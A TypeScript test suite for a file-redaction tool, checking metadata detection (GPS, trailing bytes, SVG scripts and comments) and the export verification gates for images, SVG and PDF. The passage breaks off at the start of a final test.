// SPDX-License-Identifier: MPL-2.0
/**
 * Contract tests for the Redact tool (community/redact/) — the REAL on-disk
 * hooks.js is executed, both directly (a `new Function('host', …)` harness,
 * the same shape the engine loader uses) and end-to-end via createRuntime
 * with the real manifest + template.
 *
 * Fixtures are crafted in-test: a JPEG with an EXIF GPS IFD and trailing
 * garbage past FFD9, a PNG with tEXt + eXIf chunks and bytes after IEND, an
 * APNG (acTL), a WebP with the VP8X ANIM flag, and SVGs with metadata,
 * comments, editor attributes, scripts and visible text.
 *
 * Run with: node --test tests/redact.test.ts
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

import { createRuntime } from '../engine/src/runtime.ts';
import { needsBrowserTier } from '../shells/cli/src/run.ts';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const TOOL_DIR = join(ROOT, 'community/redact');

const HOOKS_SRC = readFileSync(join(TOOL_DIR, 'hooks.js'), 'utf8');
const MANIFEST = JSON.parse(readFileSync(join(TOOL_DIR, 'tool.json'), 'utf8'));
const TEMPLATE = readFileSync(join(TOOL_DIR, 'template.html'), 'utf8');

const INPUT_IDS = MANIFEST.inputs.map((i: any) => i.id);

const BARE_HOST: any = { version: '1', profile: { get: async () => ({}) }, log: () => {} };

function redactTool(): any {
  return { manifest: MANIFEST, hooksSource: HOOKS_SRC, template: TEMPLATE };
}

// Load the real hooks the way the engine loader does: closure-scope host
// injection via new Function. Gives us direct access to onInit/onInput/
// exportFile for assertions that don't need the template.
function loadHooks(): any {
  const factory = new Function('host', `${HOOKS_SRC}\nreturn { onInit, onInput, exportFile };`);
  return factory(BARE_HOST);
}

// The raster export gate is three pure functions the hook keeps private
// (residualRasterMetadata / verifyRasterOutput scan OUTPUT bytes; the pieces
// they use are the same scanners the analysis runs). They need no canvas, so
// they are directly testable — reach them through a second harness over the
// same source rather than leaving the one gate that guards every image export
// with no coverage at all.
function loadGate(): any {
  const factory = new Function(
    'host',
    `${HOOKS_SRC}\nreturn { residualRasterMetadata, verifyRasterOutput, trailingBytes, pxLength, quantiseSpan };`
  );
  return factory(BARE_HOST);
}

// The node-geometry maths (snap-to-cover, partial coverage) plus the inline-SVG
// preparation and the node addressing. All pure — no DOM anywhere — which is
// the whole point of keeping them in the hook rather than in the canvas script.
function loadGeom(): any {
  const factory = new Function(
    'host',
    `${HOOKS_SRC}\nreturn { rectTouches, rectOverlaps, unionBox, effBox, effectiveRect, snapBarToNodes,`
    + ` subtractBox, uncoveredParts, partialNodes, parseNodeMarks, formatNodeMarks,`
    + ` prepareInlineSvg, scopeCssRules, cleanSvgTokens, tokenize,`
    + ` paintedShape, normaliseInk, inkContrast, stampFit, markStyleOf, stampTextFor,`
    + ` shapePathD, isBackdropNode, markRadiusFor, quantiseBarsPt, NEUTRAL_INK };`
  );
  return factory(BARE_HOST);
}

// The template's @geom-mirror block, evaluated on its own. It has to be pure
// (no DOM, no closure over the script above) for this to work at all — which is
// itself part of what this pins.
function loadTemplateGeom(): any {
  const m = /@geom-mirror-start([\s\S]*?)@geom-mirror-end/.exec(TEMPLATE);
  assert.ok(m, 'template.html still carries the @geom-mirror block');
  // Drop the block's own leading comment tail ("… Keep it pure: … */") and the
  // dangling opener of the closing marker's comment, which would otherwise be
  // an unterminated comment.
  const src = m![1]!.replace(/^[\s\S]*?\*\//, '').replace(/\/\*[^*]*$/, '');
  return new Function(`${src}\nreturn RDGeom;`)();
}

// The template's @resnap-plan block: the decision about which bars still have
// to be measured against the page. It runs on top of the mirror, so both blocks
// are evaluated together. Pure by construction — jsdom answers every
// getBoundingClientRect with zeroes, so the DOM wiring around this cannot be
// tested off-browser, but the decision that can leak is exactly this.
function loadTemplateResnap(): any {
  const g = /@geom-mirror-start([\s\S]*?)@geom-mirror-end/.exec(TEMPLATE);
  const r = /@resnap-plan-start([\s\S]*?)@resnap-plan-end/.exec(TEMPLATE);
  assert.ok(r, 'template.html still carries the @resnap-plan block');
  const strip = (s: string) => s.replace(/^[\s\S]*?\*\//, '').replace(/\/\*[^*]*$/, '');
  return new Function(`${strip(g![1]!)}\n${strip(r![1]!)}\nreturn RDResnap;`)();
}

// The mirror's own effBox, so the re-snap cases probe with the same effective
// rect the canvas does rather than a hand-rolled stand-in.
let RESNAP_GEOM: any = null;
const resnapGeom = (): any => (RESNAP_GEOM ||= loadTemplateGeom());

// A drawn bar, as the canvas commits one: 'm' means measured with nothing under
// it. Bars with no `n` at all are the "never measured" case vector export
// refuses, and the tests that exercise that say so explicitly.
const drawn = (x: number, y: number, w: number, h: number, over: any = {}): any =>
  ({ page: 1, x, y, w, h, n: 'm', ...over });

const fileRef = (name: string, mime: string, bytes: Uint8Array): any =>
  ({ __file: true, name, mime, size: bytes.length, bytes, url: null });

// A model in the shape hooks receive: [{id, value}] for every declared input.
function modelFor(source: any, over: Record<string, any> = {}): any[] {
  const values: Record<string, any> = {
    source, bars: [], quantise: true, grayscale: false, svgVector: false, resign: false,
    // The manifest defaults, so a test exercises what a user actually gets:
    // 'branded' means a brand tone (the neutral ink with no brand loaded) and a
    // slight corner radius, and fileKind is the hook's own write-back.
    style: 'branded', stampLabel: '', fileKind: '',
    ...over,
  };
  return INPUT_IDS.map((id: string) => ({ id, value: values[id] }));
}

// ─── byte fixtures ────────────────────────────────────────────────────────────

function concat(parts: Uint8Array[]): Uint8Array {
  let n = 0; for (const p of parts) n += p.length;
  const out = new Uint8Array(n); let o = 0;
  for (const p of parts) { out.set(p, o); o += p.length; }
  return out;
}

// TIFF (little-endian): IFD0 {Make, GPS pointer} → GPS IFD with a known
// latitude/longitude (37°48'30"N, 122°25'00"W → 37.80833, -122.41667).
function buildExifTiff(): Uint8Array {
  const buf = new Uint8Array(148);
  const dv = new DataView(buf.buffer);
  const LE = true;
  const MAKE_OFF = 38, GPS_IFD = 46, LAT_OFF = 100, LON_OFF = 124;
  buf[0] = 0x49; buf[1] = 0x49;            // "II"
  dv.setUint16(2, 42, LE);
  dv.setUint32(4, 8, LE);                  // IFD0 at offset 8
  dv.setUint16(8, 2, LE);                  // IFD0: 2 entries
  const entry = (off: number, tag: number, type: number, count: number) => { dv.setUint16(off, tag, LE); dv.setUint16(off + 2, type, LE); dv.setUint32(off + 4, count, LE); };
  entry(10, 0x010F, 2, 8); dv.setUint32(18, MAKE_OFF, LE);          // Make → out-of-line
  entry(22, 0x8825, 4, 1); dv.setUint32(30, GPS_IFD, LE);          // GPS IFD pointer
  dv.setUint32(34, 0, LE);                                          // next IFD: none
  'TestCam'.split('').forEach((c, i) => { buf[MAKE_OFF + i] = c.charCodeAt(0); });
  dv.setUint16(GPS_IFD, 4, LE);                                     // GPS IFD: 4 entries
  entry(48, 0x0001, 2, 2); buf[56] = 0x4E;                          // LatRef "N" (inline)
  entry(60, 0x0002, 5, 3); dv.setUint32(68, LAT_OFF, LE);          // Latitude → 3 rationals
  entry(72, 0x0003, 2, 2); buf[80] = 0x57;                          // LonRef "W" (inline)
  entry(84, 0x0004, 5, 3); dv.setUint32(92, LON_OFF, LE);          // Longitude → 3 rationals
  dv.setUint32(96, 0, LE);                                          // next IFD: none
  const rat = (off: number, n: number, d: number) => { dv.setUint32(off, n, LE); dv.setUint32(off + 4, d, LE); };
  rat(LAT_OFF, 37, 1); rat(LAT_OFF + 8, 48, 1); rat(LAT_OFF + 16, 30, 1);
  rat(LON_OFF, 122, 1); rat(LON_OFF + 8, 25, 1); rat(LON_OFF + 16, 0, 1);
  return buf;
}

// JPEG: SOI + APP1/EXIF(GPS) + SOS + scan data + EOI, then trailing garbage —
// the aCropalypse shape (bytes past the terminator).
function buildGpsJpegWithTrailer(trailerLen = 64): Uint8Array {
  const tiff = buildExifTiff();
  const exifId = Uint8Array.from([0x45, 0x78, 0x69, 0x66, 0x00, 0x00]);   // "Exif\0\0"
  const segLen = 2 + exifId.length + tiff.length;
  const app1 = new Uint8Array(4 + exifId.length + tiff.length);
  app1[0] = 0xFF; app1[1] = 0xE1; app1[2] = (segLen >> 8) & 0xFF; app1[3] = segLen & 0xFF;
  app1.set(exifId, 4); app1.set(tiff, 4 + exifId.length);
  return concat([
    Uint8Array.from([0xFF, 0xD8]),                                        // SOI
    app1,
    Uint8Array.from([0xFF, 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3F, 0x00, 0xAA, 0xBB, 0xFF, 0xD9]),
    new Uint8Array(trailerLen).fill(0x41),                                // the "earlier version"
  ]);
}

function pngChunk(type: string, data: Uint8Array): Uint8Array {
  const out = new Uint8Array(12 + data.length);
  const dv = new DataView(out.buffer);
  dv.setUint32(0, data.length);
  for (let i = 0; i < 4; i++) out[4 + i] = type.charCodeAt(i);
  out.set(data, 8);
  dv.setUint32(8 + data.length, 0); // CRC unchecked by the scanners
  return out;
}

const PNG_SIG = Uint8Array.from([137, 80, 78, 71, 13, 10, 26, 10]);

function ihdr(w: number, h: number): Uint8Array {
  const d = new Uint8Array(13);
  const dv = new DataView(d.buffer);
  dv.setUint32(0, w); dv.setUint32(4, h);
  d[8] = 8; d[9] = 6; // bit depth / colour type — irrelevant to the scanners
  return d;
}

function buildDirtyPng(): Uint8Array {
  return concat([
    PNG_SIG,
    pngChunk('IHDR', ihdr(100, 80)),
    pngChunk('tEXt', Uint8Array.from('Author\0Jane'.split('').map((c) => c.charCodeAt(0)))),
    pngChunk('eXIf', buildExifTiff()),
    pngChunk('IDAT', Uint8Array.from([0, 1, 2, 3])),
    pngChunk('IEND', new Uint8Array(0)),
    new Uint8Array(32).fill(0x42),                                        // bytes after IEND
  ]);
}

function buildApng(): Uint8Array {
  return concat([
    PNG_SIG,
    pngChunk('IHDR', ihdr(10, 10)),
    pngChunk('acTL', new Uint8Array(8)),
    pngChunk('IDAT', Uint8Array.from([0, 1, 2, 3])),
    pngChunk('IEND', new Uint8Array(0)),
  ]);
}

// WebP: RIFF/WEBP with a single VP8X chunk whose ANIM flag (0x02) is set.
function buildAnimWebp(): Uint8Array {
  const vp8x = new Uint8Array(10);
  vp8x[0] = 0x02;                              // flags: ANIM
  vp8x[4] = 15; vp8x[7] = 15;                  // 16x16 (width-1 / height-1, 24-bit LE)
  const riffSize = 4 + 8 + vp8x.length;        // "WEBP" + VP8X header + payload
  const head = new Uint8Array(20);
  const dv = new DataView(head.buffer);
  'RIFF'.split('').forEach((c, i) => { head[i] = c.charCodeAt(0); });
  dv.setUint32(4, riffSize, true);
  'WEBP'.split('').forEach((c, i) => { head[8 + i] = c.charCodeAt(0); });
  'VP8X'.split('').forEach((c, i) => { head[12 + i] = c.charCodeAt(0); });
  dv.setUint32(16, vp8x.length, true);
  return concat([head, vp8x]);
}

const DIRTY_SVG = `<?xml version="1.0" encoding="UTF-8"?>
<!-- hushtoken, drafted at /Users/jane/moodboard.ai -->
<svg xmlns="http://www.w3.org/2000/svg" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
  width="200" height="100" viewBox="0 0 200 100" inkscape:version="1.2 (kabc123)">
  <metadata>quietschema Jane Zebra wrote this</metadata>
  <script>alert('espionage')</script>
  <text x="10" y="50">Visible caption</text>
</svg>`;

const svgBytes = (text: string) => new TextEncoder().encode(text);

const findLabel = (findings: any[], label: string): any =>
  findings.find((f) => f.label === label);

// ─── classification by magic bytes ────────────────────────────────────────────

test('redact: classifies JPEG/PNG/WebP/SVG/PDF by magic bytes, junk stays unsupported', async () => {
  const hooks = loadHooks();
  const kindOf = async (name: string, mime: string, bytes: Uint8Array) =>
    (await hooks.onInit({ model: modelFor(fileRef(name, mime, bytes)), host: BARE_HOST })).kind;

  // The declared mime is a lie in every case — magic bytes must win.
  assert.equal(await kindOf('a.bin', 'application/octet-stream', buildGpsJpegWithTrailer()), 'JPEG');
  assert.equal(await kindOf('b.bin', 'application/octet-stream', buildDirtyPng()), 'PNG');
  assert.equal(await kindOf('c.bin', 'application/octet-stream', buildAnimWebp()), 'WebP');
  assert.equal(await kindOf('d.bin', 'application/octet-stream', svgBytes(DIRTY_SVG)), 'SVG');
  assert.equal(await kindOf('e.bin', 'application/octet-stream', svgBytes('%PDF-1.4\n1 0 obj\nendobj\n%%EOF\n')), 'PDF');

  const junk = await hooks.onInit({ model: modelFor(fileRef('f.jpg', 'image/jpeg', Uint8Array.from([1, 2, 3, 4]))), host: BARE_HOST });
  assert.equal(junk.kind, 'file');
  assert.equal(junk.supported, false);
});

// ─── findings: GPS, trailing bytes, animation, C2PA absence ──────────────────

test('redact: JPEG findings surface GPS as warn and trailing bytes with the un-cropped framing', async () => {
  const hooks = loadHooks();
  const res = await hooks.onInit({ model: modelFor(fileRef('beach.jpg', 'image/jpeg', buildGpsJpegWithTrailer())), host: BARE_HOST });

  const gps = findLabel(res.findings, 'GPS location');
  assert.ok(gps, 'GPS finding present');
  assert.equal(gps.tone, 'warn');
  assert.equal(gps.detail, '37.80833, -122.41667');

  const trailing = findLabel(res.findings, 'Data after end of image');
  assert.ok(trailing, 'trailing-bytes finding present');
  assert.equal(trailing.tone, 'warn');
  assert.match(trailing.detail, /64 B past the JPEG terminator/);
  assert.match(trailing.detail, /earlier un-cropped or un-redacted version/);

  // No C2PA bytes in the fixture → no Content Credentials finding, and its
  // absence is never claimed as a fact elsewhere.
  assert.equal(findLabel(res.findings, 'Content Credentials (C2PA)'), undefined);
});

test('redact: PNG findings surface eXIf GPS, text chunks and bytes after IEND', async () => {
  const hooks = loadHooks();
  const res = await hooks.onInit({ model: modelFor(fileRef('shot.png', 'image/png', buildDirtyPng())), host: BARE_HOST });

  assert.equal(findLabel(res.findings, 'GPS location')?.tone, 'warn');
  assert.ok(findLabel(res.findings, 'Text chunks'));
  const trailing = findLabel(res.findings, 'Data after end of image');
  assert.ok(trailing);
  assert.match(trailing.detail, /32 B past the PNG terminator/);
  assert.equal(findLabel(res.findings, 'Content Credentials (C2PA)'), undefined);
});

test('redact: APNG acTL and WebP VP8X ANIM flag are reported as animation warnings', async () => {
  const hooks = loadHooks();

  const apng = await hooks.onInit({ model: modelFor(fileRef('anim.png', 'image/png', buildApng())), host: BARE_HOST });
  const a = findLabel(apng.findings, 'Animated PNG');
  assert.ok(a, 'APNG finding present');
  assert.equal(a.tone, 'warn');
  assert.match(a.detail, /later frames may show unredacted content/);

  const webp = await hooks.onInit({ model: modelFor(fileRef('anim.webp', 'image/webp', buildAnimWebp())), host: BARE_HOST });
  const w = findLabel(webp.findings, 'Animated WebP');
  assert.ok(w, 'animated WebP finding present');
  assert.equal(w.tone, 'warn');
});

test('redact: SVG findings report editor, comment file path, metadata and scripts', async () => {
  const hooks = loadHooks();
  const res = await hooks.onInit({ model: modelFor(fileRef('art.svg', 'image/svg+xml', svgBytes(DIRTY_SVG))), host: BARE_HOST });

  assert.equal(findLabel(res.findings, 'Created with')?.detail, 'Inkscape 1.2');
  assert.ok(findLabel(res.findings, 'File path in comment'));
  assert.ok(findLabel(res.findings, 'Metadata block'));
  assert.equal(findLabel(res.findings, 'Scripts')?.tone, 'warn');
  assert.ok(findLabel(res.findings, 'Comments'));
});

test('redact: coverage meter reports repainted pixels from header dims (sandbox-pure)', async () => {
  const hooks = loadHooks();
  const bars = [{ page: 1, x: 10, y: 10, w: 40, h: 20 }];
  const res = await hooks.onInput({
    id: 'bars', value: bars,
    model: modelFor(fileRef('shot.png', 'image/png', buildDirtyPng()), { bars }),
    host: BARE_HOST,
  });
  assert.equal(res.hasCoverage, true);
  assert.ok(res.coveragePct > 0 && res.coveragePct < 100);
  assert.match(res.coverageText, /1 mark will repaint about \d+% of the pixels\./);
});

test('redact: vectorMode is true only for an SVG with the toggle on, and softens the coverage claim', async () => {
  const hooks = loadHooks();
  const bars = [{ page: 1, x: 10, y: 10, w: 40, h: 20 }];

  const svgOn = await hooks.onInput({
    id: 'svgVector', value: true,
    model: modelFor(fileRef('art.svg', 'image/svg+xml', svgBytes(DIRTY_SVG)), { svgVector: true, bars }),
    host: BARE_HOST,
  });
  assert.equal(svgOn.vectorMode, true);
  // Vector mode DELETES what a bar touches now, so the copy says so — the old
  // "covers, does not delete" wording would be the one false sentence left.
  assert.match(svgOn.coverageText, /will delete what it touches and cover about \d+% of the frame\./);
  assert.doesNotMatch(svgOn.coverageText, /repaint/);

  // A stale svgVector=true with a raster file must NOT flip the copy.
  const jpeg = await hooks.onInit({
    model: modelFor(fileRef('beach.jpg', 'image/jpeg', buildGpsJpegWithTrailer()), { svgVector: true }),
    host: BARE_HOST,
  });
  assert.equal(jpeg.vectorMode, false);
});

// ─── hook patch hygiene ───────────────────────────────────────────────────────

test('redact: onInit/onInput never return a key matching a declared input id', async () => {
  const hooks = loadHooks();
  const fixtures = [
    fileRef('a.jpg', 'image/jpeg', buildGpsJpegWithTrailer()),
    fileRef('b.png', 'image/png', buildDirtyPng()),
    fileRef('c.webp', 'image/webp', buildAnimWebp()),
    fileRef('d.svg', 'image/svg+xml', svgBytes(DIRTY_SVG)),
    fileRef('e.pdf', 'application/pdf', svgBytes('%PDF-1.4\n%%EOF\n')),
    null, // no file at all
  ];
  for (const f of fixtures) {
    const init = await hooks.onInit({ model: modelFor(f), host: BARE_HOST });
    const input = await hooks.onInput({ id: 'quantise', value: true, model: modelFor(f), host: BARE_HOST });
    for (const patch of [init, input]) {
      for (const key of Object.keys(patch)) {
        // fileKind is the ONE deliberate exception: showIf can only compare
        // input values, so the sniffed format has to be published INTO the model
        // for svgVector/resign to hide themselves on a file they don't apply to.
        if (key === 'fileKind') continue;
        assert.ok(!INPUT_IDS.includes(key), `patch key "${key}" collides with an input id (file: ${f ? f.name : 'none'})`);
      }
    }
  }
});

test('redact: hooks never mutate the input bytes', async () => {
  const hooks = loadHooks();
  const jpeg = buildGpsJpegWithTrailer();
  const before = Array.from(jpeg);
  const f = fileRef('beach.jpg', 'image/jpeg', jpeg);

  await hooks.onInit({ model: modelFor(f), host: BARE_HOST });
  // The raster export path throws headless — the input must still be intact.
  await assert.rejects(() => hooks.exportFile({ model: modelFor(f), host: BARE_HOST }));
  assert.deepEqual(Array.from(jpeg), before);

  const svg = svgBytes(DIRTY_SVG);
  const beforeSvg = Array.from(svg);
  const fs = fileRef('art.svg', 'image/svg+xml', svg);
  await hooks.onInit({ model: modelFor(fs), host: BARE_HOST });
  await hooks.exportFile({ model: modelFor(fs, { svgVector: true, bars: [drawn(20, 30, 50, 20)] }), host: BARE_HOST });
  assert.deepEqual(Array.from(svg), beforeSvg);
});

// ─── exportFile: SVG vector mode (the only path that runs headless) ──────────

test('redact: SVG vector export removes metadata/comments/scripts and appends opaque bars', async () => {
  const hooks = loadHooks();
  const bars = [drawn(20, 30, 50, 20)];
  // Solid style: square corners, so the exact rect geometry is readable here.
  // The branded default's rounded shape is pinned separately, against the same
  // square box grown by its own radius.
  const res = await hooks.exportFile({
    model: modelFor(fileRef('art.svg', 'image/svg+xml', svgBytes(DIRTY_SVG)), { svgVector: true, bars, style: 'solid' }),
    host: BARE_HOST,
  });
  assert.equal(res.mime, 'image/svg+xml');
  assert.equal(res.filename, 'art-redacted.svg');

  const out = new TextDecoder().decode(res.bytes);
  // Removed content greps clean.
  assert.doesNotMatch(out, /<metadata|quietschema|Jane Zebra/);
  assert.doesNotMatch(out, /<!--|hushtoken|moodboard|Generator/);
  assert.doesNotMatch(out, /<script|espionage|alert/);
  assert.doesNotMatch(out, /inkscape/i);
  // The visible artwork survives.
  assert.match(out, /<text x="10" y="50">Visible caption<\/text>/);
  assert.match(out, /viewBox="0 0 200 100"/);
  // The bar: 20..70 x 30..50, inflated 2px each side, width quantised UP to the
  // 24px grid (54 → 72, centred) → x 9, y 28, 72x24 — the neutral ink at full
  // opacity (no brand is loaded on BARE_HOST, so the fallback stands in).
  assert.match(out, /<rect x="9" y="28" width="72" height="24" fill="#14161a" fill-opacity="1"\/>/);
});

test('redact: SVG vector export works with no bars (still strips hidden data)', async () => {
  const hooks = loadHooks();
  const res = await hooks.exportFile({
    model: modelFor(fileRef('art.svg', 'image/svg+xml', svgBytes(DIRTY_SVG)), { svgVector: true }),
    host: BARE_HOST,
  });
  const out = new TextDecoder().decode(res.bytes);
  assert.doesNotMatch(out, /<metadata|<script|<!--/);
  assert.match(out, /Visible caption/);
});

// ─── exportFile: failures throw sentences, nothing downloads ─────────────────

test('redact: vector-mode verification failure throws a sentence when removed content survives', async () => {
  // The comment's token also appears in visible text — the gate must catch the
  // survivor and refuse to hand bytes back.
  const tricky = `<!-- ZEBRAWORD -->
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100">
  <text x="5" y="50">ZEBRAWORD stays visible</text>
</svg>`;
  const hooks = loadHooks();
  await assert.rejects(
    () => hooks.exportFile({ model: modelFor(fileRef('t.svg', 'image/svg+xml', svgBytes(tricky)), { svgVector: true }), host: BARE_HOST }),
    (e: any) => {
      assert.match(e.message, /Verification failed: removed content is still present in the SVG output\. Nothing was downloaded\./);
      return true;
    }
  );
});

test('redact: raster export throws a plain sentence when no browser canvas exists', async () => {
  const hooks = loadHooks();
  for (const f of [
    fileRef('a.jpg', 'image/jpeg', buildGpsJpegWithTrailer()),
    fileRef('b.png', 'image/png', buildDirtyPng()),
    fileRef('c.svg', 'image/svg+xml', svgBytes(DIRTY_SVG)), // default (raster) SVG path
  ]) {
    await assert.rejects(
      () => hooks.exportFile({ model: modelFor(f), host: BARE_HOST }),
      (e: any) => {
        assert.match(e.message, /needs a browser canvas/);
        assert.match(e.message, /\.$/, 'error reads as a sentence');
        return true;
      }
    );
  }
});

test('redact: exportFile refuses missing/unsupported files and hostless PDF with sentences', async () => {
  const hooks = loadHooks();
  await assert.rejects(
    () => hooks.exportFile({ model: modelFor(null), host: BARE_HOST }),
    /Choose a file first\./
  );
  await assert.rejects(
    () => hooks.exportFile({ model: modelFor(fileRef('x.bin', 'application/octet-stream', Uint8Array.from([9, 9, 9, 9]))), host: BARE_HOST }),
    /That file is not a supported image, SVG or PDF\./
  );
  await assert.rejects(
    () => hooks.exportFile({
      model: modelFor(fileRef('doc.pdf', 'application/pdf', svgBytes('%PDF-1.4\n%%EOF\n')), { bars: [{ page: 1, x: 0, y: 0, w: 10, h: 10 }] }),
      host: BARE_HOST, // no host.pdf at all
    }),
    /PDF redaction is not available in this app\./
  );
});

test('redact: SVG with no usable size refuses vector mode with guidance', async () => {
  const hooks = loadHooks();
  const sizeless = '<svg xmlns="http://www.w3.org/2000/svg"><text>hello there</text></svg>';
  await assert.rejects(
    () => hooks.exportFile({ model: modelFor(fileRef('s.svg', 'image/svg+xml', svgBytes(sizeless)), { svgVector: true }), host: BARE_HOST }),
    /This SVG has no usable size\. Turn off vector mode to export it as a PNG instead\./
  );
});

// ─── exportFile: PDF path against a contract-shaped host stub ────────────────

const PDF_SRC = svgBytes('%PDF-1.4\n1 0 obj\nendobj\n%%EOF\n');
const PDF_OUT = svgBytes('%PDF-1.7\nrebuilt image-only body\n%%EOF\n');

function pdfHost(over: any = {}): any {
  return {
    ...BARE_HOST,
    pdf: {
      analyze: async () => ({ findings: [] }),
      redact: async () => ({ bytes: PDF_OUT, pages: 2 }),
      ...over.pdf,
    },
    ...(over.c2pa ? { c2pa: over.c2pa } : {}),
  };
}

test('redact: PDF export ships the redacted bytes once every gate passes', async () => {
  const hooks = loadHooks();
  const res = await hooks.exportFile({
    model: modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC), { bars: [{ page: 1, x: 10, y: 10, w: 40, h: 12 }] }),
    host: pdfHost(),
  });
  assert.equal(res.mime, 'application/pdf');
  assert.equal(res.filename, 'doc-redacted.pdf');
  assert.deepEqual(Array.from(res.bytes), Array.from(PDF_OUT));
});

test('redact: a bar aimed past the last PDF page fails the export instead of vanishing', async () => {
  const hooks = loadHooks();
  await assert.rejects(
    () => hooks.exportFile({
      model: modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC), { bars: [{ page: 3, x: 10, y: 10, w: 40, h: 12 }] }),
      host: pdfHost(),
    }),
    /Verification failed: a bar targets page 3 but the PDF has only 2 pages\. Nothing was downloaded\./
  );
});

test('redact: a page-render warning from the bridge fails the export closed', async () => {
  const hooks = loadHooks();
  await assert.rejects(
    () => hooks.exportFile({
      model: modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC), { bars: [{ page: 1, x: 10, y: 10, w: 40, h: 12 }] }),
      host: pdfHost({ pdf: { redact: async () => ({ bytes: PDF_OUT, pages: 2, warnings: ['Page 2 could not be rendered. It ships as a blank page with its bars burned in.'] }) } }),
    }),
    /Verification failed: Page 2 could not be rendered\..*Nothing was downloaded\./
  );
});

test('redact: analyzer findings on the rebuilt PDF fail the export', async () => {
  const hooks = loadHooks();
  await assert.rejects(
    () => hooks.exportFile({
      model: modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC), { bars: [{ page: 1, x: 10, y: 10, w: 40, h: 12 }] }),
      host: pdfHost({ pdf: { analyze: async () => ({ findings: [{ label: 'Author', detail: 'Jane', tone: 'warn' }] }), redact: async () => ({ bytes: PDF_OUT, pages: 2 }) } }),
    }),
    /Verification failed: the rebuilt PDF still carries Author\. Nothing was downloaded\./
  );
});

test('redact: the structural Pages finding alone never fails the gate', async () => {
  // The analyzer inventories the page count of EVERY valid PDF — a rebuild can
  // never scan clean of it, so treating it as a leak made PDF export always fail.
  const hooks = loadHooks();
  const res = await hooks.exportFile({
    model: modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC), { bars: [{ page: 1, x: 10, y: 10, w: 40, h: 12 }] }),
    host: pdfHost({ pdf: { analyze: async () => ({ findings: [{ label: 'Pages', detail: '2 pages', tone: '' }] }) } }),
  });
  assert.deepEqual(Array.from(res.bytes), Array.from(PDF_OUT));
});

// ─── the gate against the REAL analyzer (the shipped false-positive) ─────────

// A 1x1 baseline JPEG — enough for pdf-lib's embedJpg to parse dimensions.
const TINY_JPEG = new Uint8Array(Buffer.from(
  '/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0a'
  + 'HBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAA'
  + 'AAAAAAAAAAAAB//EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AN//Z', 'base64'));

test('redact: a real rebuild through the real analyzer passes the gate', async () => {
  // The exact pipeline Andy hit in the browser: buildImagePdf output re-scanned
  // by analyzePdf. The only finding is the structural page count, which must pass.
  const { buildImagePdf } = await import('../shells/web/src/bridge/pdf-redact-core.ts');
  const { analyzePdf } = await import('../shells/web/src/bridge/pdf.ts');
  const rebuilt = await buildImagePdf([{ jpeg: TINY_JPEG, widthPt: 612, heightPt: 792 }]);
  const hooks = loadHooks();
  const res = await hooks.exportFile({
    model: modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC), { bars: [{ page: 1, x: 10, y: 10, w: 40, h: 12 }] }),
    host: pdfHost({ pdf: { analyze: analyzePdf, redact: async () => ({ bytes: rebuilt, pages: 1 }) } }),
  });
  assert.equal(res.mime, 'application/pdf');
  assert.deepEqual(Array.from(res.bytes), Array.from(rebuilt));
});

test('redact: the real analyzer still fails the gate on genuine metadata leaks', async () => {
  // A "rebuild" that carries Info metadata — the class the gate exists to stop.
  const { PDFDocument } = await import('pdf-lib');
  const { analyzePdf } = await import('../shells/web/src/bridge/pdf.ts');
  const doc = await PDFDocument.create();
  doc.addPage([612, 792]);
  doc.setAuthor('Jane Leak');
  const leaky = await doc.save({ useObjectStreams: false });
  const hooks = loadHooks();
  await assert.rejects(
    () => hooks.exportFile({
      model: modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC), { bars: [{ page: 1, x: 10, y: 10, w: 40, h: 12 }] }),
      host: pdfHost({ pdf: { analyze: analyzePdf, redact: async () => ({ bytes: leaky, pages: 1 }) } }),
    }),
    /Verification failed: the rebuilt PDF still carries (?!Pages)\S.*\. Nothing was downloaded\./
  );
});

test('redact: resign calls host.c2pa.sign with the contract shape and ships its return value', async () => {
  const hooks = loadHooks();
  const SIGNED = svgBytes('%PDF-1.7\nrebuilt image-only body\n%%EOF\nsigned incremental update\n%%EOF\n');
  let seen: any = null;
  const host = pdfHost({
    c2pa: {
      sign: async (bytes: Uint8Array, format: string, opts: any) => {
        seen = { bytes, format, opts };
        return SIGNED;
      },
    },
  });
  const res = await hooks.exportFile({
    model: modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC), { bars: [{ page: 1, x: 10, y: 10, w: 40, h: 12 }], resign: true }),
    host,
  });
  assert.ok(seen, 'sign was called');
  assert.ok(seen.bytes instanceof Uint8Array, 'sign receives bytes');
  assert.equal(seen.format, 'pdf', 'sign receives the format KEY, not an options object');
  assert.equal(typeof seen.opts.description, 'string');
  // The signed bytes ship verbatim — even though signing legitimately added a
  // second %%EOF (the gate ran on the unsigned rebuild, before signing).
  assert.deepEqual(Array.from(res.bytes), Array.from(SIGNED));
});

test('redact: a signer that throws fails the resign export visibly', async () => {
  const hooks = loadHooks();
  const host = pdfHost({ c2pa: { sign: async () => { throw new Error('No signing identity is available.'); } } });
  await assert.rejects(
    () => hooks.exportFile({
      model: modelFor(fileRef('doc.pdf', 'application/pdf', PDF_SRC), { bars: [{ page: 1, x: 10, y: 10, w: 40, h: 12 }], resign: true }),
      host,
    }),
    /No signing identity is available\./
  );
});

// ─── exportFile: SVG vector mode geometry + housekeeping-attr fidelity ───────

test('redact: a root size with no resolvable value falls back to the viewBox so bars still paint', async () => {
  const hooks = loadHooks();
  // A percentage or a font-metric unit has no value an <img> can resolve, so the
  // browser takes the viewBox as the intrinsic size. We must agree with it.
